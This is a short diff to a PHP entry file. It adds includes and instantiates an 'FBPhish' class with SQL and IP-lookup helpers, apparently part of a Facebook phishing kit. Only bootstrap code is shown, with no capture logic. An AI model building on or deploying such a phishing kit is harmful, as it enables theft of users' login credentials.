@@ -1,11 +1,22 @@
 <?php
-// Set SUPER Vars
-$apppath = dirname(__FILE__);
+// Set apppath
+$apppath = __DIR__;
 
-// Require main class
-require("$apppath/includes/main.boot.php");
+// Require . . .
+require_once("$apppath/includes/config.inc.php");
+require_once("$apppath/includes/main.boot.php");
+require_once("$apppath/includes/classes/fbphish.class.php");
+require_once("$apppath/includes/classes/sql.class.php");
+require_once("$apppath/includes/functions/debug.func.php");
+require_once("$apppath/includes/functions/getip.func.php");
 
+
+$FBPhish = new FBPhish();
+$sql = new sql();
+
+$FBPhish->init();
 $FBPhish->themecheck();
+
 $content = $FBPhish->loadPage("home");
 
 // Credits
